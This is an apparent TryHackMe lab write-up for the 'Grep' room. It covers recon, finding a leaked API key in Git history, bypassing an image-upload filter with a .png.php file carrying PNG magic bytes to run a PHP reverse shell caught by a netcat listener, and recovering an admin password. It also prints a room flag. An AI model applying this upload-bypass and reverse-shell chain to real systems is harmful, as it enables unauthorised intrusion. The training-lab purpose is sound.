# TryHackMe — Grep

This file describes all steps of execution for the TryHackMe room **Grep**.

It's a room where we used reconnaissance and OSINT to discover the application's source code and an exposed API key. We then exploited a vulnerable file upload functionality to obtain a reverse shell, enumerated the web application, and used leaked information to retrieve the user flag.

Difficulty - Easy

---

MACHINE-IP: 10.112.147.178

PORTS: 80, 443, 51337

---

## Scanning

I started by scanning all TCP ports and identifying the running services:

```bash
nmap -sS -sV -T4 -p- 10.112.147.178
```

The scan revealed three open ports:

```text
80
443
51337
```

I first checked the web server on port 80, but there did not appear to be anything useful.

Port 443 also returned an error.

Since the HTTPS service appeared to require a specific hostname, I went back to the Nmap results and investigated the domain associated with the web application.

I added `grep.thm` to `/etc/hosts`:

```bash
echo "10.112.147.178 grep.thm" >> /etc/hosts
```

After adding the hostname, I accessed the application using:

```text
https://grep.thm
```

The website was now accessible.

---

## Web Enumeration

The website indicated that it was developed by **SuperSecure Corp** and that it was still under development.

Based on the room hint, I started looking for information about the application and its source code.

I searched GitHub using:

```text
"SearchME" AND "This website is under development"
```

I found the corresponding GitHub repository.

The project was relatively new and only contained four commits, which made the commit history particularly interesting.

While examining the repository, I discovered several endpoints used by the application.

One of the endpoints allowed users to register an account, but registration required an API key.

---

## Finding the API Key

I inspected the GitHub commit history and found a commit named:

```text
remove key
```

The commit contained the API key required by the application.

I then opened Burp Suite and intercepted the registration request.

The request contained the following header:

```http
X-THM-API-Key: <API_KEY>
```

I replaced the existing value with the API key discovered in the GitHub repository.

After successfully registering and logging into the application, I obtained the first flag.

### First Flag

<details>
<summary>Spoiler Alert!</summary>

THM{4ec9806d7e1350270dc402ba870ccebb}

</details>

---

# Exploitation

During endpoint enumeration, I discovered an `upload.php` endpoint that allowed images to be uploaded.

The uploaded files were stored under:

```text
/uploads
```

The goal was to abuse this functionality to upload a PHP reverse shell.

I copied the standard PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

I then edited the reverse shell and configured the callback IP and port:

```bash
vi php-reverse-shell.php
```

---

## Bypassing the Upload Filter

The web server appeared to validate uploaded files using two mechanisms:

1. The file extension.
2. The file's magic bytes.

Therefore, simply uploading a `.php` file was not enough.

I renamed the reverse shell so that it had a `.png.php` extension:

```bash
mv php-reverse-shell.php reverse.png.php
```

I then edited the file:

```bash
vi reverse.png.php
```

I added some padding characters at the beginning of the file.

The purpose of this was to replace the padding with valid PNG magic bytes.

I used `hexedit` to modify the beginning of the file:

```bash
hexedit reverse.png.php
```

I replaced the padding with the PNG magic bytes:

```text
89 50 4e 47
```

I then verified the beginning of the file:

```bash
xxd reverse.png.php | head
```

The file now had a `.png.php` extension while starting with PNG magic bytes.

This allowed the file to bypass the upload validation.

---

## Getting a Reverse Shell

I started a Netcat listener on my machine:

```bash
nc -vlnp 1234
```

I then accessed the upload directory:

```text
https://grep.thm/api/uploads/
```

The uploaded file was listed there.

I clicked on `reverse.png.php`, causing the PHP code inside the uploaded file to execute.

The reverse shell connected back to my listener.

I upgraded the shell to a more usable interactive Bash shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then I set the terminal type:

```bash
export TERM=xterm
```

I suspended the shell:

```text
Ctrl+Z
```

Then I configured my local terminal:

```bash
stty raw -echo; fg
```

I now had a more usable interactive shell on the target.

---

# Post-Exploitation

I checked the home directories but did not find anything immediately useful.

While enumerating `/var/www`, I noticed two interesting directories.

One of them was:

```text
backup
```

Inside the directory was a file named:

```text
user.sql
```

I checked the permissions and found that I could read the file.

Since it was an SQL dump, I searched it for information related to the administrator:

```bash
cd backup
grep admin user.sql
```

This revealed the administrator's email address.
<details>
<summary>Spoiler Alert!</summary>

admin@searchme2023cms.grep.thm

</details>


---

# Leakchecker

While continuing to enumerate the web directories, I noticed another interesting folder containing several certificates.

This appeared to be related to another domain.

I added the discovered hostname to `/etc/hosts`:

```bash
echo "10.112.147.178 leakchecker.grep.thm" >> /etc/hosts
```

The original Nmap scan showed that port `51337` was open, so I investigated the service running on that port.

I accessed:

```text
http://leakchecker.grep.thm:51337
```

The application provided a way to check whether an email address had been leaked.

Since I had already obtained the administrator's email address from `user.sql`, I entered the admin email into the application.

The application returned the administrator's password.

This allowed me to authenticate as the administrator and retrieve the final user flag.

---

# Room Completed

The room was completed by combining reconnaissance, OSINT, web enumeration, and exploitation.

The main steps were:

1. Scan the target with Nmap.
2. Discover that the web application required the `grep.thm` hostname.
3. Use GitHub OSINT to locate the application's source code.
4. Find an exposed API key in the Git commit history.
5. Use the API key to register and access the application.
6. Discover the vulnerable file upload functionality.
7. Bypass the upload validation using a `.png.php` filename and PNG magic bytes.
8. Upload and execute a PHP reverse shell.
9. Enumerate `/var/www`.
10. Discover the `backup/user.sql` file.
11. Extract the administrator's email address from the SQL dump.
12. Discover the `leakchecker.grep.thm` subdomain.
13. Access the service running on port `51337`.
14. Use the administrator's email address to recover the password.
15. Retrieve the final user flag.

---

## Flags

### First Flag

<details>
<summary>Spoiler Alert!</summary>

THM{4ec9806d7e1350270dc402ba870ccebb}

</details>
